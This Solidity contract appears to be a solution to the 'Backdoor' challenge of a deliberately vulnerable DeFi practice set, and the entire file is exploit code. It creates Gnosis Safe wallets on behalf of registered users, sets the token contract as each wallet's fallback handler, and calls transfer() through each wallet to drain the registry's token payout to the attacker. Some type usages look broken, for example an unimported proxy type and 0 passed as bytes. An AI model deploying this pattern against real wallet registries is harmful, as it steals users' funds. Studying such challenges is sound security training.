// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "@gnosis.pm/safe-contracts/contracts/proxies/IProxyCreationCallback.sol";
import "../DamnValuableToken.sol";

interface IGnosisSafeProxyFactory{
     function createProxyWithCallback(
        address _singleton,
        bytes memory initializer,
        uint256 saltNonce,
        IProxyCreationCallback callback
    ) external returns (GnosisSafeProxy proxy);
}

contract attackBackdoor_fal {
    
    IGnosisSafeProxyFactory public factory;
    DamnValuableToken public immutable token; 
    address public masterCopy;
    IProxyCreationCallback public WalletRegistry;
    address public attacker;
    constructor(address _factory,address _mastercopy,address _token,address _WalletRegistry){
        factory= IGnosisSafeProxyFactory(_factory);
        masterCopy=_mastercopy;
        token=DamnValuableToken(_token);
        WalletRegistry=IProxyCreationCallback(_WalletRegistry);
        attacker=msg.sender;
    }
    function exploit(address[] memory users) public {
        for(uint i; i<4; i++){
            address[] memory owners = new address[](1);
            owners[0] = users[i];
            bytes memory initializer = abi.encodeWithSignature("setup(address[],uint256,address,bytes,address,address,uint256,address)", 
            owners, 1, address(0), 0, address(token), address(0), uint256(0), address(0));

            address proxy = address(factory.createProxyWithCallback(masterCopy, initializer, 0, WalletRegistry)); 
            
            DamnValuableToken(proxy).transfer(attacker, 10 ether);
        }
    }
}